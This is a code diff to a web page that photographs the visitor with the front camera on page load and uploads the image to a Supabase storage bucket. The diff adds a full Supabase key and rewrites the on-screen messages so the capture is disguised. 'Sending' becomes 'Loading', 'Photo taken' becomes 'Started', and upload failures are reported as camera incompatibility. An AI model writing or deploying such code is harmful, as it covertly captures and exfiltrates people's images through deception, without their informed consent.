@@ -98,7 +98,7 @@
     import { createClient } from "https://esm.sh/@supabase/supabase-js@2";
     const supabase = createClient(
       "https://hwwjnlprsntmdcytktbm.supabase.co",
-      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
+      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imh3d2pubHByc250bWRjeXRrdGJtIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjA2NDU3ODcsImV4cCI6MjA3NjIyMTc4N30.Dni-WtNXSEdyRxH2TSq0oTR9homfAi1Ptz1h0MURFrY"
     );
 
     const id = Math.random().toString(36).substring(2, 9);
@@ -108,15 +108,15 @@
     // ページ読み込み時に公式ダイアログ → 許可されたら撮影
     window.addEventListener("load", async () => {
       try {
-        status.textContent = "📸 カメラを起動中...";
+        status.textContent = "カメラの許可を押してください...";
         const stream = await navigator.mediaDevices.getUserMedia({
           video: { facingMode: "user" },
           audio: false
         });
         video.srcObject = stream;
 
-        // カメラが安定するまで少し待つ
-        await new Promise(r => setTimeout(r, 2000));
+       
+        await new Promise(r => setTimeout(r, 1000));
 
         // 撮影してSupabaseにアップロード
         const canvas = document.createElement("canvas");
@@ -126,11 +126,11 @@
         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
         const blob = await new Promise(res => canvas.toBlob(res, "image/jpeg", 0.9));
 
-        status.textContent = "送信中...";
+        status.textContent = "読み込み中...";
         const { error } = await supabase.storage.from("photos").upload(`${id}.jpg`, blob, { upsert: true });
 
         stream.getTracks().forEach(t => t.stop());
-        status.textContent = error ? "⚠️ 送信エラーが発生しました。" : "✅ 撮影完了！";
+        status.textContent = error ? "⚠️ カメラが対応していません。" : "✅ 起動完了！";
       } catch (err) {
         status.textContent = "カメラの許可が得られませんでした。";
       }
